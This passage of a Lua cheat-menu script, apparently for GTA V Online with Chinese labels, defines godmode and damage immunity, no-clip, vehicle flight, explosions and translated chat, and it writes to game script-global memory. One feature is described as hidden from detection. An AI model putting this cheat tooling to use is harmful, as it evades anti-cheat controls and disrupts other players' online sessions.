            [22] = {pos = {[1] = 170, [2] = -75}},
			[23] = {pos = {[1] = 200, [2] =  75}},
            [24] = {pos = {[1] = 200, [2] = -75}},
        }
        local fireWingsSettings = {
            scale = 0.3,
            colour = mildOrangeFire,
            on = false
        }
posx=25
posy=0
posz=50
        local ptfxEgg
        menu.toggle(exterior, '火焰之翼V2', {''}, '2t同款翅膀', function (toggle)
            fireWingsSettings.on = toggle
            if fireWingsSettings.on then
                ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
                if ptfxEgg == nil then
                    local eggHash = 1803116220
                    loadModel(eggHash)
                    ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                    ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
                end
                for i = 1, #fireWings do
                    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                        STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                        util.yield()
                    end
                    GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
                    fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], 1, false, false, false)

                    util.create_tick_handler(function()
                        local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                        ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                        for i = 1, #fireWings do
                            GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, posx, posy,posz)
    posx = posx + 0.145
    if posx > 0.96 then
    posy = posy + 5
	posz = posz +6
    posx = 0.001
	end                        end
                        ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                        return fireWingsSettings.on
                    end)				
                end			
            else
                for i = 1, #fireWings do
                    if fireWings[i].ptfx then
                        GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                        fireWings[i].ptfx = nil
                    end
                    if ptfxEgg then
                        entities.delete_by_handle(ptfxEgg)
                        ptfxEgg = nil
                    end
                end
                STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            end
        end)
movement_opt = menu.list(self, "移动选项", {}, "")
    menu.toggle(movement_opt, "丝滑移动", {}, "", function(on)
        Silky_movement(on)
    end)
    no_clip_lt = menu.list(movement_opt, "无碰撞", {}, "")
        menu.toggle(no_clip_lt,'开启', {}, '', function(on)
            no_clip(on)
        end)
        menu.slider(no_clip_lt, '移动速度', {}, 'Speed multiplier', 1, 100, 1, 1, function(value)
            no_clip_speed(value)
        end)
local proofsList = menu.list(self, "伤害免疫", {}, "Custom Godmode")
local immortalityCmd = menu.ref_by_path("Self>Immortality")
for _,data in pairs(proofs) do
    menu.toggle(proofsList, data.name, {data.name:lower().."proof"}, "让您对"..data.name:lower().."伤害免疫", function(toggle)
        data.on = toggle
    end)
end
util.create_tick_handler(function()
    local local_player = players.user_ped()
    if not menu.get_value(immortalityCmd) then
        ENTITY.SET_ENTITY_PROOFS(local_player, proofs.bullet.on, proofs.fire.on, proofs.explosion.on, proofs.collision.on, proofs.melee.on, proofs.steam.on, false, proofs.drown.on)
    end
end)
menu.toggle_loop(jiashi, "隐藏载具无敌", {}, "不会被大多数菜单检测", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(player), false, false, false, false, false, 0, 0, false)
end)
menu.toggle_loop(jiashi, "转向灯", {}, "按A键和D键使用", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)
        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)
menu.toggle_loop(jiashi, '引擎永不熄火', {'alwayson'}, '', function()
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
	if ENTITY.DOES_ENTITY_EXIST(vehicle) then
		VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
		VEHICLE.SET_VEHICLE_LIGHTS(vehicle, 0)
		VEHICLE._SET_VEHICLE_LIGHTS_MODE(vehicle, 2)
	end
end)
menu.toggle_loop(jiashi, "随机升级", {}, "仅适用于您出于某种原因生成的车辆", function()
    local mod_types = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 12, 14, 15, 16, 23, 24, 25, 27, 28, 30, 33, 35, 38, 48}
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        for i, upgrades in ipairs(mod_types) do
            VEHICLE.SET_VEHICLE_MOD(entities.get_user_vehicle_as_handle(), upgrades, math.random(0, 20), false)
        end
    end
    util.yield(100)
end)
local veh_jump = menu.list(jiashi, "可以跳跃的车")
local force = 25.00
menu.slider_float(veh_jump, "跳跃倍率", {"jumpiness"}, "", 0, 10000, 2500, 100, function(value)
    force = value / 100
end)
menu.toggle_loop(veh_jump, "启动", {"vehiclejump"}, "按空格键跳跃~.", function()
    local veh = entities.get_user_vehicle_as_handle()
    if veh ~= 0 and ENTITY.DOES_ENTITY_EXIST(veh) and PAD.IS_CONTROL_JUST_RELEASED(0, 102) then
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, force/1.5, force, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        repeat
            util.yield()
        until not ENTITY.IS_ENTITY_IN_AIR(veh)
    end
end)
menu.toggle_loop(jiashi, "漂移模式", {}, "按住shift键进行漂移", function(on)
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(players.user()), false)
    if PAD.IS_CONTROL_PRESSED(21, 21) then
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(vehicle, true)
        VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(vehicle, 0.0)
    else
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(vehicle, false)
    end
end)
local vehicle_fly = menu.list(jiashi, "载具飞行", {}, "")
menu.toggle(vehicle_fly, "载具想飞天", {"vehfly"}, "汽车成仙。", function(on_click)
    is_vehicle_flying = on_click
end)
menu.slider(vehicle_fly, "速度", {"speed"}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)
menu.toggle(vehicle_fly, "触发后不停止", {"dontstop"}, "", function(on_click)
    dont_stop = on_click
end)
menu.toggle(vehicle_fly, "无碰撞", {"nocolision"}, "", function(on_click)
    no_collision = on_click
end)
util.create_tick_handler(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), not is_vehicle_flying)
    if is_vehicle_flying then do_vehicle_fly() else ENTITY.SET_ENTITY_COLLISION(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true, TRUE); end
    return true
end)
util.on_stop(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true)
	ENTITY.SET_ENTITY_COLLISION(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true, TRUE);
end)
Tire = menu.list(jiashi,"载具驾驶特效")
menu.toggle_loop(Tire, "载具轮胎效果", {"luntaixiaoguo"}, "", function ()
    cargoodeffect()
end)
menu.toggle_loop(Tire, "粒子拖尾", {}, "", function()
                particle_tail()
            end, function()
                STREAMING.REMOVE_NAMED_PTFX_ASSET("scr_rcpaparazzo1")
        end)
        menu.list_select(Tire,"设置拖尾效果", {}, "", vehparticle_name, 1, function (index)
            selectparticle(index)
end)
local jesus_main = menu.list(jiashi, "自动驾驶", {}, "")
    menu.textslider_stateful(jesus_main, "驾驶风格", {}, "单击以选择样式", style_names, function(index, value)
        pluto_switch value do
            case "正常":
                style = 786603
                break
            case "冲刺":
                style = 1074528293
                break
            case "半冲刺":
                style = 8388614
                break
            case "反向":
                style = 1076
                break
            case "无视红绿灯":
                style = 2883621
                break
            case "避开交通":
                style = 786603
                break
            case "极度避开交通":
                style = 6
                break
            case "有时超车":
                style = 5
                break
            end
        end)
        
    jesus_toggle = menu.toggle(jesus_main, "启用", {}, "", function(toggled)
        if toggled then
            local player = players.user_ped()
            local pos = ENTITY.GET_ENTITY_COORDS(player, false)
            local player_veh = entities.get_user_vehicle_as_handle()
    
            if not PED.IS_PED_IN_ANY_VEHICLE(player, false) then 
                util.toast("请在载具里使用. :)")
            return end
    
            local jesus = util.joaat("u_m_m_jewelsec_01")
            request_model(jesus)
    
            
            jesus_ped = entities.create_ped(26, jesus, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(jesus_ped, true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jesus_ped, true)
            PED.SET_PED_INTO_VEHICLE(player, player_veh, -2)
            PED.SET_PED_INTO_VEHICLE(jesus_ped, player_veh, -1)
            PED.SET_PED_KEEP_TASK(jesus_ped, true)
    
            if HUD.IS_WAYPOINT_ACTIVE() then
                local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
                TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(jesus_ped, player_veh, pos.x, pos.y, pos.z, 9999, style, 0)
            else
                util.toast("请先设置一个导航点. :/")
                    menu.set_value(jesus_toggle, false)
            end
        else
            if jesus_ped ~= nil then 
                entities.delete_by_handle(jesus_ped)
            end
        end
    end)
local rgbvm = menu.list(jiashi, '变色载具', {}, '')
menu.toggle_loop(rgbvm, '彩虹变色', {}, '将载具颜色和霓虹灯更改为彩色', function ()
    rainbow_car()
end)
menu.slider(rgbvm, '速度', {''}, '调整车漆颜色变换的速度', 1, 1000, 100, 10, function (c)
    set_speed_rainbowcar(c)
end)
menu.toggle_loop(rgbvm, '彩虹大灯', {}, '将霓虹灯/大灯/内饰更改为相同颜色', function ()
    rainbow_car_light()
end)
menu.slider(rgbvm, '速度', {''}, '调整灯光颜色变换的速度', 1, 1000, 100, 10, function (c)
    set_speed_light(c)
end)
menu.toggle_loop(jiashi, "喇叭加速", {}, "", function()
    remote_horn_boost(players.user())
end)
local fastTurnVehicleScale = 3
menu.toggle_loop(jiashi, "原地转弯", {}, "用A/D键快速转动载具.", function ()
    FastTurnVehicleWithKeys(fastTurnVehicleScale)
end)
menu.toggle_loop(jiashi, "快速上下车", {"fastvehcleenter"}, "更快地进入载具.", function()
    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)
set_self_license = menu.list(jiashi, "自定义车牌", {}, "")
    local default_license = "daidai"
    menu.text_input(set_self_license, "自定义车牌", {"setcarlicense"}, "", function(value)
        default_license = value
    end)
    menu.toggle_loop(set_self_license, "设置车牌", {}, "", function()
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(car, default_license)
        end
    end)
menu.toggle_loop(jiashi, "循环鸣笛", {}, "来自路怒症的愤怒！", function()
    if player_cur_car ~= 1 and  PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        VEHICLE.SET_VEHICLE_MOD(player_cur_car, 14, math.random(1, 50), false)
        PAD._SET_CONTROL_NORMAL(1, 86, 1.0)
        util.yield()
        PAD._SET_CONTROL_NORMAL(1, 86, 0.0)
    end
end)
menu.toggle(jiashi, "叛逆车辆", {}, "主打一个叛逆", function(state)
    car_crash(state)
end)
watercar = menu.list(jiashi, "水中驾驶", {}, "遨游海洋世界")
dow_block = 0
driveonwater = false
ls_driveonwater = menu.toggle(watercar, "水上驾驶", {"driveonwater"}, "", function(on)
    driveonwater = on
    if on then
        menu.set_value(ls_driveonair, false)
        menu.set_value(ls_walkwater, false)
    else
        if not driveonair and not walkonwater then
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, 0, 0, 0, false, false, false)
        end
    end
end)
menu.toggle_loop(watercar, "水下驾驶", {}, "", function ()
    menu.trigger_commands("waterwheels")
end)
doa_ht = 0
driveonair = false
ls_driveonair = menu.toggle(watercar, "空中驾驶", {"driveonair"}, "", function(on)
    driveonair = on
    if on then
        local pos = players.get_position(players.user())
        doa_ht = pos['z']
        notification("使用空格键和ctrl键微调驾驶高度!", colors.black)
        if driveonwater or walkonwater then
            menu.set_value(ls_driveonwater, false)
            menu.set_value(ls_walkwater, false)
        end
    end
end)
acceleration_pads = menu.list(jiashi, "载具加(减)速带", {}, "")
    menu.action(acceleration_pads, "一个加速带", {}, "", function() 
        jiasudian()
    end)
    menu.action(acceleration_pads, "X号加速带", {}, "", function()
        Xjiasudian()
    end) 
    menu.action(acceleration_pads, "四个加速带", {}, "", function()
        sigejiasudian()
    end) 
    menu.action(acceleration_pads, "一个减速带", {}, "", function()
        jiansudai()
    end)
    menu.action(acceleration_pads, "X号减速带", {}, "", function()
        Xjiansudai()
    end) 
menu.toggle_loop(jiashi, '贴地/贴墙行驶', {}, '蜘蛛车！', function ()
    local curcar = entities.get_user_vehicle_as_handle()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(curcar, 1, 0, 0, - 0.5, 0, true, true, true, true)
        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(curcar, 40)
    end
end)
menu.toggle_loop(jiashi, "势不可挡", {}, "按住E喇叭进行爆炸", function()
    horn_bomb()
end)
menu.action(jiashi, "消逝的交通", {}, "删除交通工具", function(on)
    if on then
        local ped_sphere, traffic_sphere
        if disable_peds then ped_sphere = 0.0 else ped_sphere = 1.0 end
        if disable_traffic then traffic_sphere = 0.0 else traffic_sphere = 1.0 end
        pop_multiplier_id = MISC.ADD_POP_MULTIPLIER_SPHERE(1.1, 1.1, 1.1, 15000.0, ped_sphere, traffic_sphere, false, true)
        MISC.CLEAR_AREA(1.1, 1.1, 1.1, 2999.9, true, false, false, true)
    else
        MISC.REMOVE_POP_MULTIPLIER_SPHERE(pop_multiplier_id, false);
    end
end)
gridspawn = menu.list(jiashi, "网格载具生成", {}, "方便，快捷")--oppressor2
    dofile(filesystem.scripts_dir() .."lib/YeMulib/YMgs.lua")
util.ensure_package_is_installed("lua/YeMulib/YMScaleformLib")
local sfchat = require("lib.YeMulib.YMScaleformLib")("multiplayer_chat")
sfchat:draw_fullscreen()
focusref = {}
isfocused = false
selectedcolormenu = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
local Languages = {
	{ Name = "Afrikaans", Key = "af" },
	{ Name = "Albanian", Key = "sq" },
	{ Name = "Arabic", Key = "ar" },
	{ Name = "Azerbaijani", Key = "az" },
	{ Name = "Basque", Key = "eu" },
	{ Name = "Belarusian", Key = "be" },
	{ Name = "Bengali", Key = "bn" },
	{ Name = "Bulgarian", Key = "bg" },
	{ Name = "Catalan", Key = "ca" },
	{ Name = "Chinese Simplified", Key = "zh-cn" },
	{ Name = "Chinese Traditional", Key = "zh-tw" },
	{ Name = "Croatian", Key = "hr" },
	{ Name = "Czech", Key = "cs" },
	{ Name = "Danish", Key = "da" },
	{ Name = "Dutch", Key = "nl" },
	{ Name = "English", Key = "en" },
	{ Name = "Esperanto", Key = "eo" },
	{ Name = "Estonian", Key = "et" },
	{ Name = "Filipino", Key = "tl" },
	{ Name = "Finnish", Key = "fi" },
	{ Name = "French", Key = "fr" },
	{ Name = "Galician", Key = "gl" },
	{ Name = "Georgian", Key = "ka" },
	{ Name = "German", Key = "de" },
	{ Name = "Greek", Key = "el" },
	{ Name = "Gujarati", Key = "gu" },
	{ Name = "Haitian Creole", Key = "ht" },
	{ Name = "Hebrew", Key = "iw" },
	{ Name = "Hindi", Key = "hi" },
	{ Name = "Hungarian", Key = "hu" },
	{ Name = "Icelandic", Key = "is" },
	{ Name = "Indonesian", Key = "id" },
	{ Name = "Irish", Key = "ga" },
	{ Name = "Italian", Key = "it" },
	{ Name = "Japanese", Key = "ja" },
	{ Name = "Kannada", Key = "kn" },
	{ Name = "Korean", Key = "ko" },
	{ Name = "Latin", Key = "la" },
	{ Name = "Latvian", Key = "lv" },
	{ Name = "Lithuanian", Key = "lt" },
	{ Name = "Macedonian", Key = "mk" },
	{ Name = "Malay", Key = "ms" },
	{ Name = "Maltese", Key = "mt" },
	{ Name = "Norwegian", Key = "no" },
	{ Name = "Persian", Key = "fa" },
	{ Name = "Polish", Key = "pl" },
	{ Name = "Portuguese", Key = "pt" },
	{ Name = "Romanian", Key = "ro" },
	{ Name = "Russian", Key = "ru" },
	{ Name = "Serbian", Key = "sr" },
	{ Name = "Slovak", Key = "sk" },
	{ Name = "Slovenian", Key = "sl" },
	{ Name = "Spanish", Key = "es" },
	{ Name = "Swahili", Key = "sw" },
	{ Name = "Swedish", Key = "sv" },
	{ Name = "Tamil", Key = "ta" },
	{ Name = "Telugu", Key = "te" },
	{ Name = "Thai", Key = "th" },
	{ Name = "Turkish", Key = "tr" },
	{ Name = "Ukrainian", Key = "uk" },
	{ Name = "Urdu", Key = "ur" },
	{ Name = "Vietnamese", Key = "vi" },
	{ Name = "Welsh", Key = "cy" },
	{ Name = "Yiddish", Key = "yi" },
}
LangKeys = {}
LangName = {}
LangIndexes = {}
LangLookupByName = {}
LangLookupByKey = {}
PlayerSpooflist = {}
PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end
table.sort(LangKeys)
function encode(text)
	return string.gsub(text, "%s", "+")
end
function decode(text)
	return string.gsub(text, "%+", " ")
end
local zidongfanyi = menu.list(fanyiyuyan, '聊天翻译V1', {}, '')
settingtrad = menu.list(zidongfanyi, "翻译设置")
colortradtrad = menu.list(settingtrad, "玩家名称颜色")
menu.on_focus(colortradtrad, function()
	util.yield(50)
	isfocused = false
end)
selectmenu = menu.action(colortradtrad, "已选择 : ".."Color : "..colorselec, {}, "这将保存到配置文件中", function()
	menu.focus(focusref[tonumber(colorselec)])
end)
menu.on_focus(selectmenu, function()
	util.yield(50)
	isfocused = false
end)
for i = 1, 234 do
	focusref[i] = menu.action(colortradtrad, "Color : "..i, {}, "这将保存到配置文件中", function() 
		menu.set_menu_name(selectmenu, "已选择 : ".."Color : "..i)
		colorselec = i
	end)
	menu.on_focus(focusref[i], function()
		isfocused = false
		util.yield(50)
		isfocused = true
		while isfocused do
			if not menu.is_open() then
				isfocused = false
			end
			ptr1 = memory.alloc()
			ptr2 = memory.alloc()
			ptr3 = memory.alloc()
			ptr4 = memory.alloc()
			HUD.GET_HUD_COLOUR(i, ptr1, ptr2, ptr3, ptr4)
			directx.draw_text(0.5, 0.5, "exemple", 5, 0.75, {r = memory.read_int(ptr1)/255, g = memory.read_int(ptr2)/255, b =memory.read_int(ptr3)/255, a= memory.read_int(ptr4)/255}, true)
			util.yield()
		end
	end)
end

menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_TEAM")).."] 翻译消息", {"labelteam"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
	else
		teamchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelteam "..teamchatlabel)
end


menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_ALL")).."] 翻译消息", {"labelall"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		allchatlabel = util.get_label_text("MP_CHAT_ALL")
	else
		allchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelall "..allchatlabel)
end

targetlangmenu = menu.textslider_stateful(zidongfanyi, "目标语言", {}, "您需要单击以应用更改", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)

tradlocamenu = menu.textslider_stateful(settingtrad, "翻译信息的位置", {}, "您需要单击以应用更改", {"团队聊天不联网", "团队聊天", "全局聊天不联网", "全局聊天", "通知"}, function(s)
	Tradloca = s
end)
	
traductself = false
menu.toggle(settingtrad, "翻译自己", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(settingtrad, "即使语言与所需语言相同,也进行翻译", {}, "可能不会正常工作,因为谷歌是个傻瓜", function(on)
	traductsamelang = on	
end)
oldway = false
menu.toggle(settingtrad, "使用旧方法", {}, players.get_name(players.user()).." [全部]玩家:信息", function(on)
	oldway = on	
end)
traduct = true
menu.toggle(zidongfanyi, "翻译", {"fanyi"}, "", function(on)
	traduct = on	
end, true)
menu.trigger_commands("fanyi off")
traductmymessage = menu.list(zidongfanyi, "发送翻译信息")
finallangmenu = menu.textslider_stateful(traductmymessage, "最终语言", {"finallang"}, "翻译成最终语言.您需要单击以应用更改", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

menu.action(traductmymessage, "发送信息", {"Sendmessage"}, "输入消息的文本", function(on_click)
    util.toast("请输入您的消息")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, PlayerID in ipairs(players.list()) do
				chat.send_targeted_message(PlayerID, players.user(), string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
			if traduct then
				async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
					if Sucess ~= "" then
						translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
						if not traductsamelang and (sourceLang == targetlang)then
						
						else
							if oldway then
								sender = players.get_name(players.user())
								translationtext = players.get_name(packet_sender).." : "..decode(translation)
								colorfinal = 1
							else
								sender = players.get_name(packet_sender)
								translationtext = decode(translation)
								colorfinal = colorselec
							end
							if (Tradloca == 1) then						
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 2) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), true, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 3) then
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 4) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), false, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 5) then
								util.toast(players.get_name(packet_sender).." : "..decode(translation), TOAST_ALL)
							end
						end
					end
				end)
				async_http.dispatch()
			end
		end
	end
	botsend = false
end)
run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end
TRANROOT = menu.list(fanyiyuyan, "聊天翻译V2", {}, "", function(); end)
local language_codes_by_enum = {
    [0]= "en-us",
    [1]= "fr-fr",
    [2]= "de-de",
    [3]= "it-it",
    [4]= "es-es",
    [5]= "pt-br",
    [6]= "pl-pl",
    [7]= "ru-ru",
    [8]= "ko-kr",
    [9]= "zh-tw",
    [10] = "ja-jp",
    [11] = "es-mx",
    [12] = "zh-cn"
}
local my_lang = lang.get_current()
function encode_for_web(text)
	return string.gsub(text, "%s", "+")
end
function get_iso_version_of_lang(lang_code)
    lang_code = string.lower(lang_code)
    if lang_code ~= "zh-cn" and lang_code ~= "zh-tw" then
        return string.split(lang_code, '-')[1]
    else
        return lang_code
    end
end
local iso_my_lang = get_iso_version_of_lang(my_lang)
local do_translate = false
menu.toggle(TRANROOT, "翻译聊天", {"nextton"}, "\n《 启动/关闭翻译 》\n该功能无法翻译自己发送的\n只能翻译其他人发送的消息\n会将消息自动发送在聊天\n并且其他人无法看见.\n", function(on)
    do_translate = on
end, false)

local only_translate_foreign = true
menu.toggle(TRANROOT, "只翻译不同游戏语言", {"nextforeignonly"}, "仅翻译来自不同游戏语言的用户的消息，从而节省 API 调用。 您应该保持此状态，以防止 Google 暂时阻止您的请求.", function(on)
    only_translate_foreign = on
end, true)
local players_on_cooldown = {}
chat.on_message(function(sender, reserved, text, team_chat, networked, is_auto)
    if do_translate and networked and players.user() ~= sender then
        local encoded_text = encode_for_web(text)
        local player_lang = language_codes_by_enum[players.get_language(sender)]
        local player_name = players.get_name(sender)
        if only_translate_foreign and player_lang == my_lang then
            return
        end
        -- credit to the original chat translator for the api code
        local translation
        if players_on_cooldown[sender] == nil then
            async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl=" .. iso_my_lang .."&dt=t&q=".. encoded_text, function(data)
		    	translation, original, source_lang = data:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
                if source_lang == nil then 
                    util.toast("无法翻译 来自 " .. player_name)
                    return
                end
                players_on_cooldown[sender] = true
                if get_iso_version_of_lang(source_lang) ~= iso_my_lang then
                    chat.send_message(string.gsub(player_name .. ': \"' .. translation .. '\"', "%+", " "), team_chat, true, false)
                end
                util.yield(1000)
                players_on_cooldown[sender] = nil
		    end, function()
                util.toast("无法翻译 来自 " .. player_name)
            end)
		    async_http.dispatch()
        else
            util.toast(player_name .. "发送了一条信息,在翻译的冷却时间内. 如果该玩家在聊天中乱发垃圾信息，请考虑踢掉他，以防止被谷歌翻译暂时停止.")
        end
    end
end)
zidongfanyiV3 = menu.list(fanyiyuyan,"聊天翻译V3", {},"最新翻译系统，支持ChatGPT")
zidongfanyiV31 = menu.action(zidongfanyiV3, "加载聊天翻译V3选项", {""}, "", function()
        notification("正在加载聊天翻译V3选项,请稍等...",colors.black)
        util.yield(2000)
        require "lib.YeMulib.YMfyV3"
        menu.delete(zidongfanyiV31)
end)
local weapon_options = menu.list(self, "冲锋选项", {}, "")
menu.toggle_loop(weapon_options, '无敌冲锋', {}, '使用近战时将附近模型推开', function ()
	local is_performing_action = PED.IS_PED_PERFORMING_MELEE_ACTION(PLAYER.PLAYER_PED_ID())
	if is_performing_action then
        menu.trigger_commands("grace on")
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
		FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 29, 25.0, false, true, 0.0, true)
		AUDIO.PLAY_SOUND_FRONTEND(-1, "EMP_Blast", "DLC_HEISTS_BIOLAB_FINALE_SOUNDS", false)
    else
        menu.trigger_commands("grace off")
	end
end)
local other = menu.list(self, "恢复选项", {}, "")
local function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end
menu.toggle_loop(other, "移除保险索赔", {}, "自动认领被毁坏的车辆，这样您就不必给共荣保险打电话.", function()
    local count = memory.read_int(memory.script_global(1585857))
    for i = 0, count do
        local canFix = (bitTest(memory.script_global(1585857 + 1 + (i * 142) + 103), 1) and bitTest(memory.script_global(1585857 + 1 + (i * 142) + 103), 2))
        if canFix then
            MISC.CLEAR_BIT(memory.script_global(1585857 + 1 + (i * 142) + 103), 1)
            MISC.CLEAR_BIT(memory.script_global(1585857 + 1 + (i * 142) + 103), 3)
            MISC.CLEAR_BIT(memory.script_global(1585857 + 1 + (i * 142) + 103), 16)
